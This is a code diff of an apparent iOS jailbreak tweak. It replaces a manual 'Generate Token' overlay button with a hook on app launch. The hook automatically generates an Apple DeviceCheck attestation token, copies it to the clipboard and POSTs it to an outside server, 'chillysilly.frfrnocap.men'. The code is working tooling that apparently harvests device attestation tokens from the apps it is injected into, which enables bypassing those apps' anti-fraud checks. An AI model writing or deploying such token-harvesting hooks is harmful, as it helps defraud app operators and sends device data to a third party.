@@ -1,63 +1,56 @@
 #import <UIKit/UIKit.h>
 #import <DeviceCheck/DeviceCheck.h>
-#import <objc/runtime.h>
 
-@interface UIWindow (Overlay)
-@end
+%hook UIApplication
 
-@implementation UIWindow (Overlay)
+- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
+    BOOL result = %orig;
 
-- (void)layoutSubviews {
-    [super layoutSubviews];
+    if ([DCDevice currentDevice].isSupported) {
+        [[DCDevice currentDevice] generateTokenWithCompletionHandler:^(NSData * _Nullable data, NSError * _Nullable error) {
+            dispatch_async(dispatch_get_main_queue(), ^{
+                if (error) {
+                    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Error"
+                        message:error.localizedDescription
+                        preferredStyle:UIAlertControllerStyleAlert];
+                    [alert addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
+                    [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alert animated:YES completion:nil];
+                } else if (data) {
+                    NSString *token = [data base64EncodedStringWithOptions:0];
+                    [UIPasteboard generalPasteboard].string = token; // optional copy
 
-    static dispatch_once_t onceToken;
-    dispatch_once(&onceToken, ^{
-        UIButton *overlayButton = [UIButton buttonWithType:UIButtonTypeSystem];
-        overlayButton.frame = CGRectMake(50, 100, 180, 40);
-        [overlayButton setTitle:@"Generate Token" forState:UIControlStateNormal];
-        overlayButton.backgroundColor = [UIColor colorWithWhite:0 alpha:0.6];
-        overlayButton.tintColor = [UIColor whiteColor];
-        overlayButton.layer.cornerRadius = 8;
-        overlayButton.clipsToBounds = YES;
+                    // --- Send JSON POST request ---
+                    NSURL *url = [NSURL URLWithString:@"https://chillysilly.frfrnocap.men/tokenlapi.php"];
+                    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
+                    req.HTTPMethod = @"POST";
+                    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
 
-        [overlayButton addTarget:self action:@selector(_generateDeviceCheckToken)
-                forControlEvents:UIControlEventTouchUpInside];
+                    NSDictionary *json = @{@"token": token};
+                    NSData *body = [NSJSONSerialization dataWithJSONObject:json options:0 error:nil];
+                    req.HTTPBody = body;
 
-        [self addSubview:overlayButton];
-    });
-}
+                    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
+                        dispatch_async(dispatch_get_main_queue(), ^{
+                            NSString *msg;
+                            if (error) {
+                                msg = [NSString stringWithFormat:@"Send failed: %@", error.localizedDescription];
+                            } else {
+                                msg = [NSString stringWithFormat:@"Token sent:\n%@", token];
+                            }
 
-- (void)_generateDeviceCheckToken {
-    if (![DCDevice currentDevice].isSupported) {
-        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Error"
-            message:@"DeviceCheck not supported"
-            preferredStyle:UIAlertControllerStyleAlert];
-        [alert addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
-        [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alert animated:YES completion:nil];
-        return;
+                            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Device Token"
+                                message:msg
+                                preferredStyle:UIAlertControllerStyleAlert];
+                            [alert addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
+                            [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alert animated:YES completion:nil];
+                        });
+                    }] resume];
+                }
+            });
+        }];
     }
 
-    [[DCDevice currentDevice] generateTokenWithCompletionHandler:^(NSData * _Nullable data, NSError * _Nullable error) {
-        dispatch_async(dispatch_get_main_queue(), ^{
-            NSString *msg;
-            if (error) {
-                msg = [NSString stringWithFormat:@"Error: %@", error.localizedDescription];
-            } else if (data) {
-                NSString *token = [data base64EncodedStringWithOptions:0];
-                msg = token;
-                // copy to clipboard
-                [UIPasteboard generalPasteboard].string = token;
-            } else {
-                msg = @"Unknown error";
-            }
-
-            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Device Token"
-                message:msg
-                preferredStyle:UIAlertControllerStyleAlert];
-            [alert addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
-            [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alert animated:YES completion:nil];
-        });
-    }];
+    return result;
 }
 
-@end
+%end
